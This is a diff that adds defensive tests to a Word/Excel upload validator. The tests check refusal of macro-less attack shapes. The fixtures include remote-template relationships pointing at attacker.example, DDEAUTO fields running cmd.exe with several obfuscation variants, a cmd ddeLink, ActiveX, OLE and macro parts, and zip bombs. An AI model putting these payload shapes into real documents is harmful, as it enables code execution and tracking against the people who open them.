@@ -203,3 +203,204 @@ describe("text is the one class the declared type splits", () => {
     assert.equal((await detectTeamHubFileType(gif89, "text/plain")).mime, "image/gif");
   });
 });
+
+// Word and Excel can do harm with no macro at all. Each fixture below is the real part layout Office
+// writes for that feature, so the check is proved on the shape an attacker would actually send.
+const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
+const REL_NS = 'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"';
+const R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
+const rels = (...relationships: string[]) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships ${REL_NS}>${relationships.join("")}</Relationships>`;
+const wordBody = (body: string) => `<?xml version="1.0" encoding="UTF-8"?><w:document ${W}><w:body>${body}</w:body></w:document>`;
+const withDocument = (body: string, extra: Entry[] = [], deflate = true): Uint8Array =>
+  zip([...docxEntries(deflate).filter((entry) => entry.name !== "word/document.xml"), { name: "word/document.xml", data: wordBody(body), deflate }, ...extra]);
+const docxWith = (extra: Entry[], deflate = true) => zip([...docxEntries(deflate), ...extra]);
+const xlsxWith = (extra: Entry[], deflate = true) => zip([...xlsxEntries(deflate), ...extra]);
+const refusal = async (bytes: Uint8Array, mime = DOCX) => (await teamHubFileVerdict(bytes, mime)).reason;
+const accepted = async (bytes: Uint8Array, mime = DOCX) =>
+  assert.deepEqual(await teamHubFileVerdict(bytes, mime), { accept: true, detectedMime: mime, reason: null });
+const ddeRun = (instruction: string) =>
+  `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">${instruction}</w:instrText></w:r>` +
+  `<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>shown</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
+
+describe("Word and Excel content that runs or loads something without a macro", () => {
+  it("a Word file whose template is fetched from outside the file (remote attachedTemplate) is refused", async () => {
+    const bytes = docxWith([
+      { name: "word/settings.xml", data: `<w:settings ${W}><w:attachedTemplate r:id="rId1" xmlns:r="${R}"/></w:settings>`, deflate: true },
+      { name: "word/_rels/settings.xml.rels", data: rels(`<Relationship Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/>`), deflate: true },
+    ]);
+    assert.deepEqual(await teamHubFileVerdict(bytes, DOCX), { accept: false, detectedMime: null, reason: "external_content" });
+  });
+  it("a Word file with an ordinary external hyperlink is accepted", async () => {
+    await accepted(withDocument('<w:p><w:hyperlink r:id="rId9" xmlns:r="' + R + '"><w:r><w:t>our site</w:t></w:r></w:hyperlink></w:p>', [
+      { name: "word/_rels/document.xml.rels", data: rels(`<Relationship Id="rId9" Type="${R}/hyperlink" Target="https://example.com/a?b=1&amp;c=2" TargetMode="External"/>`), deflate: true },
+    ]));
+  });
+  it("an Excel file with an ordinary external hyperlink is accepted, stored or deflated", async () => {
+    for (const deflate of [false, true]) {
+      await accepted(xlsxWith([
+        { name: "xl/worksheets/_rels/sheet1.xml.rels", data: rels(`<Relationship Id="rId1" Type="${R}/hyperlink" Target="https://example.com/" TargetMode="External"/>`), deflate },
+      ], deflate), XLSX);
+    }
+  });
+  it("an external target of any other kind is refused, however TargetMode is spelled", async () => {
+    for (const relationship of [
+      `<Relationship Id="rId1" Type="${R}/oleObject" Target="file://host/share/x.sct" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${R}/image" Target="https://attacker.example/pixel.png" TargetMode="External"/>`,
+      `<Relationship Id="rId1" Type="${R}/frame" Target="https://attacker.example/" TargetMode="External"/>`,
+      `<Relationship TargetMode="External" Target="https://attacker.example/" Id="rId1" Type="${R}/attachedTemplate"/>`,
+      `<Relationship Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="external"/>`,
+      `<Relationship Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="Ext&#101;rnal"/>`,
+      `<Relationship Id="rId1" Type='${R}/attachedTemplate' Target='https://attacker.example/' TargetMode = 'External' />`,
+      `<pr:Relationship xmlns:pr="http://schemas.openxmlformats.org/package/2006/relationships" Id="rId1" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="External"/>`,
+      // A hyperlink type with a second Type attribute is not one plain hyperlink.
+      `<Relationship Id="rId1" Type="${R}/hyperlink" Type="${R}/attachedTemplate" Target="https://attacker.example/" TargetMode="External"/>`,
+    ]) {
+      assert.equal(await refusal(docxWith([{ name: "word/_rels/settings.xml.rels", data: rels(relationship), deflate: true }])), "external_content", relationship);
+    }
+  });
+  it("an Excel file with an external workbook link (xl/externalLinks/) is refused", async () => {
+    const bytes = xlsxWith([
+      { name: "xl/externalLinks/externalLink1.xml", data: '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>', deflate: true },
+    ]);
+    assert.deepEqual(await teamHubFileVerdict(bytes, XLSX), { accept: false, detectedMime: null, reason: "external_content" });
+  });
+  it("an internal externalLink relationship is refused even when its part hides under another folder", async () => {
+    const bytes = xlsxWith([
+      { name: "xl/_rels/workbook.xml.rels", data: rels(`<Relationship Id="rId3" Type="${R}/externalLink" Target="links/one.xml"/>`), deflate: true },
+      { name: "xl/links/one.xml", data: '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>', deflate: true },
+    ]);
+    assert.equal(await refusal(bytes, XLSX), "external_content");
+  });
+  it("an embedded OLE object (embeddings/oleObject1.bin) is refused", async () => {
+    const bytes = docxWith([{ name: "word/embeddings/oleObject1.bin", data: ole }]);
+    assert.deepEqual(await teamHubFileVerdict(bytes, DOCX), { accept: false, detectedMime: null, reason: "embedded_content" });
+  });
+  it("ActiveX, ribbon customisation, embedded packages and stray .bin parts are refused", async () => {
+    for (const name of ["word/activeX/activeX1.xml", "xl/activeX/activeX1.bin", "customUI/customUI14.xml", "word/embeddings/Microsoft_Excel_Worksheet.xlsx",
+      "word/media/payload.bin", "WORD/ACTIVEX/activeX1.xml", "word/activ%65X/activeX1.xml", "word/embedding%73/oleObject1.dat"]) {
+      assert.equal(await refusal(docxWith([{ name, data: "<x/>" }])), "embedded_content", name);
+    }
+    assert.equal(await refusal(xlsxWith([{ name: "xl/embeddings/oleObject1.bin", data: ole }]), XLSX), "embedded_content");
+  });
+  it("a vbaProject part under any name or case is a macro", async () => {
+    for (const name of ["word/vbaProjectSignature.bin", "xl/vbaproject2.xml", "word/vbaProject%2Ebin"]) {
+      assert.equal(await refusal(docxWith([{ name, data: "<x/>" }])), "macro_content", name);
+    }
+  });
+  it("an internal relationship to an OLE object, control, package or macro is refused wherever its part lives", async () => {
+    for (const [type, reason] of [
+      [`${R}/oleObject`, "embedded_content"],
+      [`${R}/package`, "embedded_content"],
+      [`${R}/control`, "embedded_content"],
+      ["http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary", "embedded_content"],
+      ["http://schemas.microsoft.com/office/2007/relationships/ui/extensibility", "embedded_content"],
+      ["http://schemas.microsoft.com/office/2006/relationships/vbaProject", "macro_content"],
+    ]) {
+      const bytes = withDocument("<w:p/>", [
+        { name: "word/_rels/document.xml.rels", data: rels(`<Relationship Id="rId5" Type="${type}" Target="media/thing.xml"/>`), deflate: true },
+        { name: "word/media/thing.xml", data: "<x/>", deflate: true },
+      ]);
+      assert.equal(await refusal(bytes), reason, type);
+    }
+  });
+  it("printer setup is the one .bin accepted, and only as printer settings", async () => {
+    const printer = (type: string) => xlsxWith([
+      { name: "xl/worksheets/_rels/sheet1.xml.rels", data: rels(`<Relationship Id="rId1" Type="${R}/${type}" Target="../printerSettings/printerSettings1.bin"/>`), deflate: true },
+      { name: "xl/printerSettings/printerSettings1.bin", data: new Uint8Array(64).fill(7) },
+    ]);
+    await accepted(printer("printerSettings"), XLSX);
+    assert.equal(await refusal(printer("oleObject"), XLSX), "embedded_content");
+    assert.equal(await refusal(printer("image"), XLSX), "embedded_content");
+  });
+  it("a DDE or DDEAUTO field instruction is refused, in every way Word stores one", async () => {
+    for (const [label, body] of [
+      ["DDEAUTO complex field", ddeRun('DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"')],
+      ["DDE complex field", ddeRun('DDE "Excel" "Sheet1" "R1C1"')],
+      ["lower-case keyword after spaces", ddeRun("   ddeauto c:\\\\x.exe")],
+      ["instruction split across runs",
+        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\\\x.exe</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'],
+      ["entity-encoded keyword", ddeRun("&#68;DEAUTO c:\\\\x.exe")],
+      ["CDATA keyword", ddeRun("<![CDATA[DDEAUTO c:\\\\x.exe]]>")],
+      ["simple field", '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\x.exe "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>'],
+      ["keyword computed by a nested QUOTE field",
+        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>QUOTE 68 68 69</w:instrText></w:r>' +
+        '<w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:instrText> c:\\\\x.exe</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'],
+    ]) {
+      assert.deepEqual(await teamHubFileVerdict(withDocument(body), DOCX), { accept: false, detectedMime: null, reason: "dde_field" }, label);
+    }
+  });
+  it("a DDE field in a header part is refused too", async () => {
+    const bytes = docxWith([{ name: "word/header1.xml", data: `<w:hdr ${W}>${ddeRun("DDEAUTO c:\\\\x.exe")}</w:hdr>`, deflate: true }]);
+    assert.equal(await refusal(bytes), "dde_field");
+  });
+  it("ordinary fields, and the word DDE as body text, are accepted", async () => {
+    await accepted(withDocument(ddeRun(" PAGE ") + ddeRun('HYPERLINK "https://example.com"') + ddeRun("DATE \\@ \"d MMMM\"") +
+      "<w:p><w:r><w:t>DDEAUTO is a field we refuse</w:t></w:r></w:p>"));
+  });
+  it("a part declaring an encoding other than UTF-8 or UTF-16 is refused", async () => {
+    const body = '<?xml version="1.0" encoding="UTF-7"?><w:document ' + W + "><w:body/></w:document>";
+    const bytes = zip([...docxEntries(true).filter((entry) => entry.name !== "word/document.xml"), { name: "word/document.xml", data: body, deflate: true }]);
+    assert.equal(await refusal(bytes), "malformed_document");
+  });
+  it("a part name that is not a clean URI is refused", async () => {
+    assert.equal(await refusal(docxWith([{ name: "word\\activeX\\activeX1.xml", data: "<x/>" }])), "malformed_document");
+    assert.equal(await refusal(docxWith([{ name: "word/%E0%A4%A.xml", data: "<x/>" }])), "malformed_document");
+  });
+});
+
+describe("inflating Word and Excel parts is bounded and fails closed", () => {
+  it("a document whose parts would inflate past 50 MB is refused before anything is inflated", async () => {
+    const bytes = zip([...docxEntries(true).filter((entry) => entry.name !== "word/document.xml"),
+      { name: "word/document.xml", data: new Uint8Array(51 * 1024 * 1024).fill(0x20), deflate: true }]);
+    assert.ok(bytes.length < 10 * 1024 * 1024, "the bomb fits under the upload cap");
+    assert.equal(await refusal(bytes), "oversized_document");
+  });
+  it("several parts that together pass 50 MB are refused", async () => {
+    const big = new Uint8Array(26 * 1024 * 1024).fill(0x20);
+    const bytes = docxWith([{ name: "word/header1.xml", data: big, deflate: true }, { name: "word/footer1.xml", data: big, deflate: true }]);
+    assert.equal(await refusal(bytes), "oversized_document");
+  });
+  it("a part that inflates past its recorded size (a lying bomb) is refused, not expanded", async () => {
+    const bytes = zip([...docxEntries(true).filter((entry) => entry.name !== "word/document.xml"),
+      { name: "word/document.xml", data: new Uint8Array(60 * 1024 * 1024).fill(0x20), deflate: true, declaredSize: 1024 }]);
+    assert.equal(await refusal(bytes), "malformed_document");
+  });
+  it("inflation stops at the recorded size: a lying bomb never expands in memory", async () => {
+    // Count the bytes the real DecompressionStream hands the reader. Without the stop, every one
+    // of the 60 MB would be inflated before the size mismatch was noticed.
+    const Real = globalThis.DecompressionStream;
+    let produced = 0;
+    globalThis.DecompressionStream = class {
+      readable: ReadableStream<Uint8Array>; writable: WritableStream<Uint8Array>;
+      constructor(format: "deflate-raw") {
+        const inner = new Real(format);
+        this.writable = inner.writable;
+        this.readable = inner.readable.pipeThrough(new TransformStream<Uint8Array, Uint8Array>({
+          transform(chunk, controller) { produced += chunk.length; controller.enqueue(chunk); },
+        }));
+      }
+    } as unknown as typeof DecompressionStream;
+    try {
+      const bytes = zip([...docxEntries(true).filter((entry) => entry.name !== "word/document.xml"),
+        { name: "word/document.xml", data: new Uint8Array(60 * 1024 * 1024).fill(0x20), deflate: true, declaredSize: 1024 }]);
+      assert.equal(await refusal(bytes), "malformed_document");
+      assert.ok(produced < 4 * 1024 * 1024, `inflated ${produced} bytes before stopping`);
+    } finally {
+      globalThis.DecompressionStream = Real;
+    }
+  });
+  it("a part whose deflate stream is corrupt, or whose method is neither stored nor deflate, is refused", async () => {
+    const corrupt = docxWith([{ name: "word/_rels/document.xml.rels", data: RELS, method: 8, body: new Uint8Array([0xff, 0xff, 0xff, 0xff]) }]);
+    assert.equal(await refusal(corrupt), "malformed_document");
+    const bzip2 = docxWith([{ name: "word/_rels/document.xml.rels", data: RELS, method: 12 }]);
+    assert.equal(await refusal(bzip2), "malformed_document");
+    const stored = docxWith([{ name: "word/_rels/document.xml.rels", data: RELS, declaredSize: RELS.length + 5 }]);
+    assert.equal(await refusal(stored), "malformed_document");
+  });
+  it("a relationships part that is not well-formed is refused", async () => {
+    for (const data of [rels('<Relationship Id="rId1" Type="x" Target="y'), `<!DOCTYPE r [<!ENTITY e "External">]>${rels('<Relationship Id="rId1" Type="x" TargetMode="&e;"/>')}`,
+      rels('<!-- an unterminated comment <Relationship Id="rId1" TargetMode="External"/>'), rels("<Relationship Id=rId1/>")]) {
+      assert.equal(await refusal(docxWith([{ name: "word/_rels/settings.xml.rels", data, deflate: true }])), "malformed_document", data);
+    }
+  });
+});
